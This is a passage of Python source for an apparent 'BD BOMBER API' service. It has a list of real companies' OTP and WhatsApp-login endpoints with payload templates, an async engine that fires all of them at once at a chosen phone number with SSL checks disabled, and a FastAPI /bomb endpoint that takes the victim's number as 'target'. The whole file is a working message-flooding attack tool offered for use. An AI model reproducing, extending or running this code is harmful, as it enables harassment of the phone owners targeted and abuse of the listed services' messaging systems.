    {"name": "XB Go App", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "data": lambda p: json.dumps({"full_name": "BLACKFIRE", "company_name": "Bomber", "email_address": "blactfiretools@gmail.com", "phone_number": p['with_0']}), "type": "sms"},
    {"name": "KPN WhatsApp", "method": "POST", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "data": lambda p: json.dumps({"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+88", "number": p['raw']}}), "type": "whatsapp"},
    {"name": "Rappi WhatsApp", "method": "POST", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "data": lambda p: json.dumps({"country_code": "+88", "phone": p['raw']}), "type": "whatsapp"},
    {"name": "Foxy WhatsApp", "method": "POST", "url": "https://www.foxy.in/api/v2/users/send_otp", "data": lambda p: json.dumps({"user": {"phone_number": p['with_plus88']}, "via": "whatsapp"}), "type": "whatsapp"},
    {"name": "Stratzy WhatsApp", "method": "POST", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "data": lambda p: json.dumps({"phoneNo": p['raw']}), "type": "whatsapp"},
    {"name": "Eka Care WhatsApp", "method": "POST", "url": "https://auth.eka.care/auth/init", "data": lambda p: json.dumps({"payload": {"allowWhatsapp": True, "mobile": p['with_plus88']}, "type": "mobile"}), "type": "whatsapp"},
]

# ============================================================
# MERGE ALL APIS
# ============================================================

APIS.extend(GET_APIS)
APIS.extend(POST_APIS)

# ============================================================
# BOMBER ENGINE
# ============================================================

async def fire_api(session, api, phone_data):
    try:
        key = api.get("key", "with_0")
        url = api["url"].replace("{phone}", phone_data[key])
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
        }
        
        if api["method"] == "POST":
            data = api.get("data")
            if data:
                if callable(data):
                    data_str = data(phone_data)
                else:
                    data_str = data
            else:
                data_str = None
            
            if data_str:
                if isinstance(data_str, dict):
                    async with session.post(url, headers=headers, json=data_str, timeout=5, ssl=False) as resp:
                        if 200 <= resp.status < 400:
                            return True
                else:
                    async with session.post(url, headers=headers, data=data_str, timeout=5, ssl=False) as resp:
                        if 200 <= resp.status < 400:
                            return True
            else:
                async with session.post(url, headers=headers, timeout=5, ssl=False) as resp:
                    if 200 <= resp.status < 400:
                        return True
        else:
            async with session.get(url, headers=headers, timeout=5, ssl=False) as resp:
                if 200 <= resp.status < 400:
                    return True
    except:
        pass
    return False

async def run_bomb(phone_data):
    success = 0
    total = len(APIS)
    
    async with aiohttp.ClientSession() as session:
        tasks = [fire_api(session, api, phone_data) for api in APIS]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r)
    
    return {
        "target": phone_data['with_0'],
        "total_apis": total,
        "success": success,
        "failed": total - success
    }

# ============================================================
# ENDPOINTS
# ============================================================

@app.get("/")
async def root():
    return {
        "status": "🔥 BD BOMBER API (152 APIs)",
        "owner": "@felix_bhai",
        "total_apis": len(APIS),
        "usage": "/bomb?phone=017XXXXXXXX"
    }

@app.get("/bomb")
async def bomb(phone: str = Query(..., description="11-digit BD phone number")):
    phone_data = format_phone(phone)
    
    if not phone_data['with_0'].startswith('01') or len(phone_data['with_0']) != 11:
        return JSONResponse({
            "success": False,
            "owner": "@felix_bhai",
            "message": "Invalid BD phone number! Must be 11 digits starting with 01"
        }, status_code=400)
    
    result = await run_bomb(phone_data)
    
    return JSONResponse({
        "success": True,
        "owner": "@felix_bhai",
        **result,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    })

@app.get("/apis")
async def list_apis():
    return {
        "total": len(APIS),
        "apis": [{"name": a["name"], "method": a["method"], "type": a.get("type", "sms")} for a in APIS]
    }

# ============================================================
# RUN
# ============================================================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print("=" * 60)
    print("🔥 BD BOMBER API STARTED 🔥")
    print(f"📡 Total APIs: {len(APIS)}")
    print(f"👤 Owner: @felix_bhai")
    print(f"🌐 Port: {port}")
    print("=" * 60)
    uvicorn.run(app, host="0.0.0.0", port=port)